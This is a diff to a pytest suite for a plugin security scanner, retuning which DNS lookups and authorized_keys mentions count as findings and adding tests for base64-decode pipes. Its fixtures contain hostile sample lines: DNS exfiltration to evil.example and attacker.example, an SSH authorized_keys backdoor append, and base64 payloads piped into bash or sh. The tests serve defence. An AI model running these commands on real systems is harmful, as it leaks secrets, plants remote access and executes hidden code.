@@ -230,13 +230,27 @@ class TestLegitimatePluginPayload:
         ('const lookup = `dig +short +time=3 A ${hostname}`;\n', "dns_exfil"),
         ('const help = "Add this public key to authorized_keys on the server.";\n', "ssh_backdoor"),
     ])
-    def test_desktop_capability_references_require_confirmation(self, tmp_path, source, pattern):
+    def test_desktop_capability_references_are_notes_not_blocks(self, tmp_path, source, pattern):
+        # A DNS *lookup* of a user host (``dig A ${host}``, no attacker-domain suffix — the pattern no
+        # longer treats it as exfil) and an ``authorized_keys`` mention in a UI string (no write action,
+        # demoted to a note) are disclosed capabilities, not exfil/backdoors: the plugin installs clean.
         plugin = _mk_plugin(tmp_path, {**BASE_FILES, "desktop/plugin.js": source})
         result = scan_plugin(plugin)
-        assert any(f.pattern_id == pattern for f in result.findings)
-        assert result.verdict == "caution"
-        assert should_allow_plugin_install(result)[0] is None
-        assert should_allow_plugin_install(result, force=True)[0] is True
+        hit = next((f for f in result.findings if f.pattern_id == pattern), None)
+        assert hit is None or hit.severity in ("low", "medium")   # absent or a verdict-neutral note
+        assert result.verdict == "safe"
+        assert should_allow_plugin_install(result)[0] is True
+
+    @pytest.mark.parametrize("source,pattern", [
+        ('const cmd = `dig $(whoami).evil.example`;\n', "dns_exfil"),             # interpolation into attacker domain
+        ('run(["sh", "-c", \'echo "$KEY" >> ~/.ssh/authorized_keys\']);\n', "ssh_backdoor"),  # real append
+    ])
+    def test_desktop_capability_attack_twins_still_flag(self, tmp_path, source, pattern):
+        plugin = _mk_plugin(tmp_path, {**BASE_FILES, "desktop/plugin.js": source})
+        result = scan_plugin(plugin)
+        hit = next((f for f in result.findings if f.pattern_id == pattern), None)
+        assert hit is not None and hit.severity in ("high", "critical")
+        assert result.verdict in ("caution", "dangerous")
 
     @pytest.mark.parametrize("filename,source", [
         ("launch.sh", 'host $SECRET.attacker.example\n'),
@@ -603,12 +617,19 @@ class TestInertContextDemotions:
         assert sev[("run.py", "dump_all_env")] == "high"      # os.system("printenv"): executes
 
     def test_base64_decode_to_text_filter_vs_interpreter(self, tmp_path):
+        """A decode into a text filter is not a finding; a decode reaching an interpreter at
+        any stage (``| gunzip | sh``, ``| sh | grep``) or an archive unpacker (the payload is
+        code the scanner never sees) is high."""
         files = dict(BASE_FILES)
         files["scripts/open-pr.sh"] = "gh api repos/x/contents/y --jq .content | base64 -d | grep '^sha:'\n"
+        files["scripts/unpack.sh"] = "base64 -d assets.b64 | tar xz -C build\n"
         files["scripts/boot.sh"] = "cat payload.b64 | base64 -d | bash\n"
+        files["scripts/gz.sh"] = "cat payload.b64 | base64 -d | gunzip | sh\n"
+        files["scripts/tail.sh"] = "base64 -d payload.b64 | sh | grep ok\n"
         result = scan_plugin(_mk_plugin(tmp_path, files), source="owner/repo")
         sev = {f.file: f.severity for f in result.findings if f.pattern_id == "base64_decode_pipe"}
-        assert sev == {"scripts/open-pr.sh": "medium", "scripts/boot.sh": "high"}
+        assert sev == {"scripts/boot.sh": "high", "scripts/gz.sh": "high", "scripts/tail.sh": "high",
+                       "scripts/unpack.sh": "high"}
 
 
 class TestIntakeFalsePositiveClasses:
